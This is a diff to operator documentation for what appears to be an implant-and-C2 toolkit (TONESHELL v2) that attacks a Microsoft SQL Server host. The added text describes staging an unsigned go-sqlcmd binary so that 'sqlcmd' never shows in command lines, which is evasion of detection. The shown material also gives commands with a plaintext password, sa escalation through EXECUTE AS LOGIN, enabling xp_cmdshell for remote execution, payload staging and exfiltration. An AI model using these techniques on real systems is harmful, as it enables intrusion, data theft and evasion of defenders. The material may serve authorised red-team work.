@@ -59,7 +59,7 @@ graph LR
 ## Target context
 
 - **Operator machine:** runs `toneshell_shell.py` against controlServer on `localhost:<port>`
-- **WS01:** TONESHELL v2 implant active; `sqlcmd` installed; line-of-sight TCP/1433 to IIS01
+- **WS01:** TONESHELL v2 implant active; go-sqlcmd binary staged on disk and its path passed to `xpinit` (host's installed `sqlcmd` unused); line-of-sight TCP/1433 to IIS01
 - **IIS01:** SQL Server Express instance `IIS01\SQLEXPRESS`; `svc_app_dev` has `EXECUTE AS LOGIN='sa'` capability; `sp_OA` and `xp_cmdshell` enabled after `xpinit`; `controlServer/files/` directory must exist before any exfil operation
 - **Privilege required:** domain user (`svc_app_dev`) escalated to SA context via `EXECUTE AS LOGIN='sa'`
 
@@ -103,9 +103,18 @@ Must run `xpinit` first.
 
 `xpinit` enables `sp_OA` + `xp_cmdshell` and also grants `ADMINISTER BULK OPERATIONS` to the login (required for `OPENROWSET(BULK)` in `xpfile cat` and `xpexfil-hex`).
 
+`xpinit` accepts an optional 4th argument — the full path to a staged sqlcmd-compatible executable (go-sqlcmd) on the implant host. When set, every tunnel invocation runs that binary instead of the host's installed `sqlcmd`, so the string `sqlcmd` never appears in any command line. Stage the binary first (`put` from the C2 payloads dir, or any other transfer primitive), then pass its path — quote it if it contains spaces:
+
+```
+put go-sqlcmd.exe C:\Windows\Temp\<name>.exe
+xpinit IIS01\SQLEXPRESS svc_app_dev D3vPortal!2025 C:\Windows\Temp\<name>.exe
+```
+
+The `xpinit` connectivity check runs through the staged binary, so a wrong path or a non-executable file fails immediately. If the 4th argument is omitted, invocations fall back to bare `sqlcmd` (PATH lookup). The binary itself is built from [`../../../go-sqlcmd/`](../../../go-sqlcmd/) (classic CLI via the `cmd/modern` entrypoint; ~25 MB, unsigned, no external dependencies).
+
 | Command | What it does |
 |---|---|
-| `xpinit <host:port> <login> <pass>` | Enable sp_OA + xp_cmdshell on MSSQL target; grant ADMINISTER BULK OPERATIONS; verify with server name + service account |
+| `xpinit <host:port> <login> <pass> [sqlcmd_path]` | Enable sp_OA + xp_cmdshell on MSSQL target; grant ADMINISTER BULK OPERATIONS; verify with server name + service account; when `sqlcmd_path` is set, all tunnel invocations run the staged exe |
 | `xpshell cmd <command>` | **[DEPRECATED]** Run cmd.exe command on IIS01 via `.bat` staging (4 sqlcmd round-trips); use `xpexec` instead |
 | `xpshell psh <ps_script_content>` | **[DEPRECATED]** Stage and run PowerShell script on IIS01 via `.ps1` staging (3 sqlcmd round-trips); use `xpexec powershell -Command "..."` instead |
 | `xpstage-aes <payload_name> [--no-encrypt]` | **[DEPRECATED]** Transfer binary to IIS01 via `tempdb..stg` - AES-256-CBC encrypted, PowerShell decode on IIS01; use `xpstage-hex` instead |
